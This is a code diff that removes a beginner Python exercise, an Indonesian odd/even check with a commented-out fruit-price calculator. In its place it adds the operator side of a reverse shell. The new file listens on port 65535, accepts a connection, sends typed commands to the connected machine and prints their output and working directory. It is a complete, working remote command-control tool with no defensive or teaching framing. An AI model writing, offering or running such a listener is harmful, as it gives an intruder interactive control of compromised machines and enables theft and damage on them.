@@ -1,44 +1,36 @@
-"""
-print(""buah yang tersedia
-1. jeruk = 2000
-2. apel = 3000
-3. anggur = 5000
-4. manggis = 3000
-5. melon = 4000
-"")
-"""
+import socket
 
-bilangan = int(input('Masukkan : '))
-
-if bilangan % 2 == 0:
-    print('Adalah bilangan genap')
-else:
-    print('Bilangan ganjil')
-
-
-
-
-
-
-
-"""
-n = int(input('Tolong masukkan harga buah yang tersedia misal untuk membeli jeruk masukkan harga 2000 rupiah : '))
-
-def total(barang, barang2):
-    return barang + barang2
-
-if n != 2000 and n != 3000 and n != 5000 and n != 3000 and n != 4000 and n > 4000:
-    print('Anda harus memasukkan harga yang sesuai dengan buah yang tersedia!')
-if n == 2000 or n == 3000 or n == 5000 or n == 3000 or n == 4000:    
-    nanya = input('Mau pilih lagi? : ')
-    if nanya == 'y' or nanya == 'Y':
-        n_2 = int(input('Masukkan harga buah yang tersedia lagi : '))
-        if n_2 != 2000 and n_2 != 3000 and n_2 != 5000 and n_2 != 3000 and n_2 != 4000 and n_2 > 4000:
-            print('Anda harus memasukkan harga yang sesuai dengan buah yang tersedia!')
-        else:
-            Total = total(n,n_2)
-            print('Total : ', Total)
-    elif nanya == 'n' or nanya == 'N':
-        print('Total : ', n)
-        
-"""
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 65535
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+# create a socket object
+s = socket.socket()
+# bind the socket to all IP addresses of this host
+s.bind((SERVER_HOST, SERVER_PORT))
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+# accept any connections attempted
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+# receiving the current working directory of the client
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[+] Current working directory:", cwd)
+while True:
+    # get the command from prompt
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        # empty command
+        continue
+    # send the command to the client
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    # retrieve command results
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    # split command output and current directory
+    results, cwd = output.split(SEPARATOR)
+    # print output
+    print(results)
